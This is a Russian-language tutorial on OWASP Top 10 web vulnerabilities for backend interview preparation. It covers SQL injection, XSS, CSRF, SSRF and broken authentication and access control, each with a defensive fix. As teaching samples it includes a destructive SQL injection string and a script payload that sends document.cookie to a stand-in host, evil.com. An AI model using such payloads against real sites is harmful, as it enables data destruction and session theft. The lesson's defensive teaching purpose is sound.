# OWASP Top 10: основные уязвимости

> Цель урока: знать главные веб-уязвимости (инъекции, XSS, CSRF, SSRF, broken
> auth) и как от них защищаться. Безопасность спрашивают почти на каждом
> бэкенд-собесе хотя бы поверхностно; «что такое SQL-инъекция и как её предотвратить»
> — обязательный минимум.

## Инъекции (SQL injection)

**Инъекция** — когда **недоверенный ввод** пользователя попадает в команду
(SQL, shell, и т.п.) и **интерпретируется как код**, а не данные. Классика —
**SQL injection**: подстановка пользовательского ввода прямо в SQL-строку.

```python
# УЯЗВИМО: ввод склеивается в запрос
query = f"SELECT * FROM users WHERE name = '{name}'"
# name = "'; DROP TABLE users; --"  → выполнит вредоносный SQL

# БЕЗОПАСНО: параметризованный запрос — ввод идёт как ДАННЫЕ, не код
cursor.execute("SELECT * FROM users WHERE name = %s", (name,))
```

Главная защита — **параметризованные запросы (prepared statements)**: СУБД получает
ввод **отдельно** от текста запроса и трактует его как значение, а не как часть
команды. **ORM (SQLAlchemy) делает это по умолчанию** — поэтому опасны именно
ручные f-string/конкатенации в SQL. Тот же принцип — против любых инъекций: никогда
не склеивать недоверенный ввод в команды (для shell — не `os.system(f"...")`, а
`subprocess` со списком аргументов).

**Аналогия.** SQL-инъекция — как продиктовать секретарю «запиши: имя — Иван; и
заодно сожги все документы». Если секретарь не отличает данные от команд, он
выполнит и вредную часть. Параметризация — чёткие бланки: «вот поле для имени», куда
нельзя вписать команду.

## XSS

**XSS (Cross-Site Scripting)** — внедрение **вредоносного JavaScript** в страницу,
который выполнится в браузере **других пользователей** (украсть cookie/токен,
действовать от их имени). Происходит, когда пользовательский ввод **выводится в
HTML без экранирования**.

```text
Пользователь ввёл коммент: <script>fetch('evil.com?c='+document.cookie)</script>
Если вывести его в HTML как есть — скрипт выполнится у всех, кто откроет страницу.
```

Защита:

- **Экранирование вывода** — превращать `<`, `>`, `&` в HTML-сущности при выводе
  (современные шаблонизаторы — Jinja2, React — экранируют **по умолчанию**).
- **CSP (Content Security Policy)** — заголовок, ограничивающий, откуда грузить
  скрипты (запретить inline-скрипты).
- Не вставлять ввод в опасные контексты (`innerHTML`, `eval`).

Ключ: **XSS — про вывод** (экранировать при отображении), в отличие от инъекций
(про ввод в команды). React/Jinja2 защищают, пока вы не обходите их через
`dangerouslySetInnerHTML`/`| safe`.

**Аналогия.** XSS — как подсунуть в общую доску объявлений записку, которая, будучи
прочитанной, заставляет читателя выполнить команду. Экранирование — показывать
текст записки буквально (как символы), а не исполнять то, что в ней написано.

## CSRF и SSRF

Две «forgery»-атаки, которые путают:

- **CSRF (Cross-Site Request Forgery)** — чужой сайт заставляет **браузер жертвы**
  отправить запрос на сайт, где она залогинена, используя её **cookie**
  (см. курс Web/HTTP). Защита: **SameSite cookie**, **CSRF-токены**; **JWT в
  заголовке** к CSRF неуязвим.
- **SSRF (Server-Side Request Forgery)** — атакующий заставляет **ваш сервер**
  сделать запрос на **произвольный адрес**, который укажет (например, через
  поле «загрузить картинку по URL»). Опасно тем, что сервер может достучаться до
  **внутренних** ресурсов (метаданные облака `169.254.169.254`, внутренние сервисы),
  недоступных снаружи. Защита: **валидация и whitelist** разрешённых адресов,
  запрет приватных диапазонов, не ходить по произвольным URL от пользователя.

```text
CSRF: атака использует браузер ЖЕРТВЫ (её cookie) → действие на вашем сайте
SSRF: атака использует ВАШ СЕРВЕР → запрос к внутренним ресурсам
```

**Аналогия.** CSRF — заставить чужого сотрудника (браузер жертвы) с его пропуском
сделать что-то в офисе. SSRF — обманом заставить **вашего курьера** (сервер) сходить
в закрытую серверную и принести оттуда секреты.

## Broken authentication и контроль доступа

Две частые категории из OWASP:

- **Broken authentication** — слабая аутентификация: пароли в открытом виде/слабый
  хэш, отсутствие защиты от брутфорса, предсказуемые токены сессий, не истекающие
  сессии. Защита: сильное **хэширование паролей** (bcrypt/argon2 + соль — отдельный
  урок), rate limiting на логин, безопасные токены, **MFA**.
- **Broken access control** — пользователь получает доступ к **чужим данным/
  действиям**: классика — **IDOR** (Insecure Direct Object Reference): `GET
  /orders/123` без проверки, что заказ принадлежит **этому** пользователю. Защита:
  **проверять авторизацию на каждом запросе** (не только аутентификацию), не
  полагаться на «скрытость» URL, проверять владение ресурсом на сервере.

```python
# УЯЗВИМО (IDOR): отдаём заказ по id без проверки владельца
order = db.get(Order, order_id)        # а вдруг это чужой заказ?

# БЕЗОПАСНО: проверяем, что ресурс принадлежит текущему пользователю
order = db.get(Order, order_id)
if order.user_id != current_user.id:
    raise HTTPException(403)
```

Различие важно: **аутентификация** — «кто ты», **авторизация** — «что тебе можно».
Broken access control — про вторую: даже залогиненный не должен видеть чужое.

**Аналогия.** Broken access control — как гостиница, где любой ключ открывает любой
номер: вы вошли в здание (аутентификация), но должны попадать **только в свой**
номер (авторизация). Проверять «твой ли это номер» нужно на каждой двери.

## Памятка для собеседования

- **Инъекции (SQLi)** — недоверенный ввод как **код**; защита —
  **параметризованные запросы** (ORM по умолчанию), никогда не склеивать ввод в
  команды.
- **XSS** — вредоносный JS в странице; защита — **экранирование вывода** (Jinja2/
  React по умолчанию), **CSP**. XSS про **вывод**, инъекции про **ввод**.
- **CSRF** (браузер жертвы + cookie → SameSite/токены, JWT неуязвим) vs **SSRF**
  (ваш сервер → внутренние ресурсы → whitelist URL, запрет приватных диапазонов).
- **Broken auth** (хэш паролей, rate limit, MFA) и **broken access control**
  (**IDOR** → проверять владение ресурсом). Аутентификация (кто) ≠ авторизация (что
  можно).

## Частые ошибки в ответах

- Склеивать ввод в SQL/shell вместо параметризации; думать, что ORM не защищает (он
  защищает, пока не пишешь сырой SQL вручную).
- Путать XSS (вывод) и инъекции (ввод), CSRF и SSRF.
- Проверять только аутентификацию, забывая авторизацию (IDOR).
- Считать «скрытый» URL защитой доступа.
